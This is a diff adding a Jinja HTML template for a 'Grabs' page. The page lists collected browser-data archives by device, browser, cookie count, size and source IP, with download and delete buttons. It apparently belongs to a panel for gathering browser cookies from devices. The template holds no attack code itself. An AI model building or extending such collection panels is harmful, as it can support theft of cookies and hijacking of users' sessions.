@@ -1,0 +1,73 @@
+{% extends "base.html" %}
+
+{% block title %}Grabs{% endblock %}
+
+{% block content %}
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <i class="fas fa-box-archive"></i> Browser Data Archives
+                <span class="badge bg-primary float-end">{{ grabs|length }} Total</span>
+                <a href="{{ url_for('grab_page') }}" class="btn btn-sm btn-outline-success float-end me-2">
+                    <i class="fas fa-circle-info"></i> How to collect
+                </a>
+            </div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-hover">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Device</th>
+                                <th>Browsers</th>
+                                <th>Cookies</th>
+                                <th>Size</th>
+                                <th>IP</th>
+                                <th>Received</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for grab in grabs %}
+                            <tr>
+                                <td>{{ grab.id }}</td>
+                                <td>{{ grab.device_label }}</td>
+                                <td>
+                                    {% for b in grab.browsers.split(',') if b.strip() %}
+                                        <span class="badge bg-secondary">{{ b.strip() }}</span>
+                                    {% endfor %}
+                                </td>
+                                <td>{{ grab.cookie_count }}</td>
+                                <td>{{ grab.size_mb }} MB</td>
+                                <td>{{ grab.ip_address or 'N/A' }}</td>
+                                <td>{{ grab.created_at.strftime('%Y-%m-%d %H:%M') if grab.created_at }}</td>
+                                <td>
+                                    <a href="{{ url_for('grab_download', grab_id=grab.id) }}"
+                                       class="btn btn-sm btn-outline-primary" title="Download zip">
+                                        <i class="fas fa-download"></i>
+                                    </a>
+                                    <form method="POST" action="{{ url_for('grab_delete', grab_id=grab.id) }}"
+                                          style="display:inline;"
+                                          onsubmit="return confirm('Delete this archive?');">
+                                        <button type="submit" class="btn btn-sm btn-outline-danger">
+                                            <i class="fas fa-trash"></i>
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                            {% else %}
+                            <tr>
+                                <td colspan="8" class="text-center text-muted">
+                                    No archives yet. Visit <a href="{{ url_for('grab_page') }}">How to collect</a>.
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
